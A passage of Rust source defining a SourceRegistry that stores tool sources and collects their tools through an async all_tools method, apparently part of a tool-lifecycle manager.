    async fn tools(&self) -> Result<Vec<ToolArc>, SourceError>;
}

/// A registry of sources — what the lifecycle manager iterates over.
#[derive(Default)]
pub struct SourceRegistry {
    sources: Vec<std::sync::Arc<dyn ToolSource>>,
}

impl SourceRegistry {
    pub fn new() -> Self {
        Self::default()
    }
    pub fn add(&mut self, source: impl ToolSource + 'static) {
        self.sources.push(std::sync::Arc::new(source));
    }
    pub fn len(&self) -> usize {
        self.sources.len()
    }
    pub fn is_empty(&self) -> bool {
        self.sources.is_empty()
    }
    /// Run every source's `tools()` concurrently and flatten the results.
    pub async fn all_tools(&self) -> Result<Vec<ToolArc>, SourceError> {
        let mut all = Vec::new();
        for s in &self.sources {
            let tools = s.tools().await?;
            all.extend(tools);
        }
        Ok(all)
    }
    /// Iterate sources (for `rc sources` listing).
    pub fn iter(&self) -> impl Iterator<Item = std::sync::Arc<dyn ToolSource>> + '_ {
        self.sources.iter().cloned()
    }
}
```
